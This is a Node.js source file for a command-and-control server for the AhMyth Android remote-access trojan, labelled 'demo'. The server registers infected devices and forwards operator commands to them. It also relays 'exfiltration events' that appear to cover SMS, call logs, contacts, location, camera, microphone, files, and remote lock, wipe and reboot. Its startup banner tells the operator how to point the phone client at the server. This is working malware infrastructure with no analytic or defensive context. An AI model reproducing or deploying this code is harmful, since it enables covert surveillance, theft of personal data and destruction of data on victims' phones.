/**
 * AhMyth C2 Server — Demo Dashboard Server
 * ==========================================
 * Serves the interactive C2 dashboard + Socket.IO relay.
 *
 * USAGE:
 *   1. Install:  npm install socket.io express
 *   2. Run:      node .freebuff/c2-server.js
 *   3. Open:     http://localhost:42474
 *
 * The Android client connects to this same port.
 */

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');

const PORT = 42474;
const DASHBOARD_PATH = path.join(__dirname, 'c2-dashboard.html');

// ---- Express: serve the dashboard HTML ----
const app = express();
const server = http.createServer(app);

app.get('/', (req, res) => {
  if (fs.existsSync(DASHBOARD_PATH)) {
    res.sendFile(DASHBOARD_PATH);
  } else {
    res.status(500).send('Dashboard file not found at: ' + DASHBOARD_PATH);
  }
});

app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', clients: getConnectedDevices() });
});

// ---- Socket.IO: C2 relay ----
const io = new Server(server, {
  cors: { origin: '*' },
  pingTimeout: 60000,
  pingInterval: 25000,
});

// Track connected devices and dashboards
const connectedDevices = new Map();   // socketId -> deviceInfo
const dashboards = new Set();         // socketId (of dashboard connections)

function getConnectedDevices() {
  return Array.from(connectedDevices.values());
}

io.on('connection', (socket) => {
  console.log(`[+] New connection: ${socket.id}`);

  // ---- Device client connection ----
  // Android client sends device info as query params
  const query = socket.handshake.query || {};
  const isDashboard = query._dashboard === 'true';

  if (!isDashboard) {
    // This is an Android device connecting
    const deviceInfo = {
      socketId: socket.id,
      model: query.model || 'Unknown',
      manufacturer: query.manf || 'Unknown',
      androidVersion: query.release || 'Unknown',
      deviceId: (query.id || '').substring(0, 8) + '...',
      connectedAt: new Date().toISOString(),
    };
    connectedDevices.set(socket.id, deviceInfo);
    console.log(`[+] Device connected: ${deviceInfo.model} (${deviceInfo.manufacturer})`);

    // Broadcast updated device list to all dashboards
    io.emit('devices:update', getConnectedDevices());

    // Handle all exfiltration events from the device
    const dataEvents = [
      'x0000sm', 'x0000cl', 'x0000cn', 'x0000lm', 'x0000apps',
      'x0000ca', 'x0000mc', 'x0000sc', 'x0000fm',
      'x0000runApp', 'x0000openUrl', 'x0000dm',
      'x0000lockDevice', 'x0000wipeDevice', 'x0000rebootDevice',
      'x0000deleteFF', 'x0000nt',
    ];

    dataEvents.forEach((event) => {
      socket.on(event, (data) => {
        console.log(`[📥] ${event} from ${deviceInfo.model}:`, JSON.stringify(data).substring(0, 200));
        // Forward to all connected dashboards
        io.emit('device:response', {
          socketId: socket.id,
          deviceInfo: {
            model: deviceInfo.model,
            manufacturer: deviceInfo.manufacturer,
          },
          event,
          data,
          timestamp: new Date().toISOString(),
        });
      });
    });

    // Handle disconnection
    socket.on('disconnect', () => {
      connectedDevices.delete(socket.id);
      console.log(`[-] Device disconnected: ${deviceInfo.model}`);
      io.emit('devices:update', getConnectedDevices());
    });

  } else {
    // This is a dashboard connection
    dashboards.add(socket.id);
    console.log(`[+] Dashboard connected: ${socket.id}`);

    // Send current device list immediately
    socket.emit('devices:update', getConnectedDevices());

    // Handle command from dashboard -> forward to device
    socket.on('command:send', (payload) => {
      const { targetSocketId, command } = payload;
      const targetSocket = io.sockets.sockets.get(targetSocketId);

      if (targetSocket) {
        console.log(`[➡️] Forwarding command to ${targetSocketId}:`, JSON.stringify(command));
        targetSocket.emit('order', command);
        // Acknowledge to dashboard
        socket.emit('command:sent', {
          targetSocketId,
          command,
          timestamp: new Date().toISOString(),
        });
      } else {
        socket.emit('command:error', {
          message: 'Target device is no longer connected',
          targetSocketId,
        });
      }
    });

    socket.on('disconnect', () => {
      dashboards.delete(socket.id);
      console.log(`[-] Dashboard disconnected: ${socket.id}`);
    });
  }
});

// ---- Start server ----
server.listen(PORT, '0.0.0.0', () => {
  console.log('');
  console.log('╔══════════════════════════════════════════════╗');
  console.log('║       AhMyth C2 Server — Demo Mode          ║');
  console.log('╠══════════════════════════════════════════════╣');
  console.log(`║  Dashboard:  http://localhost:${PORT}           ║`);
  console.log(`║  C2 Port:    ${PORT} (Socket.IO)                 ║`);
  console.log('╠══════════════════════════════════════════════╣');
  console.log('║  Update app/build.gradle:                   ║');
  console.log(`║  SOCKET_URL = "http://YOUR_IP:${PORT}"        ║`);
  console.log('╚══════════════════════════════════════════════╝');
  console.log('');
  console.log('Waiting for connections...');
});
